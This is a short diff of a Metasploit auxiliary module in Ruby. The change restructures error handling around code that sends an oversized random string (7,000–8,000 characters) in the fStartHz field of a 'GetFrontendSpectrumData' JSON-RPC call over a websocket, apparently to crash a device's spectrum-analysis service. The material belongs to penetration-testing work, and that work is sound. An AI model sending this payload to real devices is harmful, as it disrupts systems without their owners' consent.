@@ -75,24 +75,22 @@ class MetasploitModule < Msf::Auxiliary
         print_status('Opened connection')
 
         EM::Timer.new(1) do
-          begin
-            print_status('Sending payload')
-            payload = Rex::Text.rand_text_alphanumeric(7000..8000)
-            driver.send({
-              jsonrpc: '2.0',
-              method: 'Frontend::GetFrontendSpectrumData',
-              params: {
-                coreID: 0,
-                fStartHz: payload,
-                fStopHz: 1000000000,
-                fftSize: 1024,
-                gain: 1
-              },
-              id: '0'
-            }.to_json)
-          rescue StandardError
-            fail_with(Failure::Unreachable, 'Could not establish websocket connection')
-          end
+          print_status('Sending payload')
+          payload = Rex::Text.rand_text_alphanumeric(7000..8000)
+          driver.send({
+            jsonrpc: '2.0',
+            method: 'Frontend::GetFrontendSpectrumData',
+            params: {
+              coreID: 0,
+              fStartHz: payload,
+              fStopHz: 1000000000,
+              fftSize: 1024,
+              gain: 1
+            },
+            id: '0'
+          }.to_json)
+        rescue StandardError
+          fail_with(Failure::Unreachable, 'Could not establish websocket connection')
         end
       end
 
